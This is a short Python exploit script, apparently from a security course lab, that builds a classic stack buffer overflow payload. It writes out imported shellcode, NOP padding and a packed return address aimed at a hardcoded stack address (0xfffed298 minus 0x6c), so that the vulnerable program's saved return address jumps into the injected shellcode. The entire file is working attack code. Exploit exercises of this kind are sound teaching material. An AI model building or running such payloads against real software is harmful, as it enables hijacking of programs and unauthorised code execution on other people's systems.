#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

'''directly overwrite vulnerable return address to shellcode address'''

VULNERABLE_EBP = 0xfffed298     # vulnerable %ebp
ADDR_DIFF = 0x6c                # %ebp - buf start address          (108-byte)
# shell code start address (buf start address)
SHELL_CODE_ADDR = VULNERABLE_EBP-ADDR_DIFF
SHELL_CODE_SIZE = 0x17          # shell code length in byte         (23-byte)
VULNERABLE_FP_SIZE = 0x04       # vulnerable frame pointer size     (4-byte)
sys.stdout.buffer.write(shellcode+b'\x90'*(ADDR_DIFF-SHELL_CODE_SIZE+VULNERABLE_FP_SIZE)+pack('<I',SHELL_CODE_ADDR))
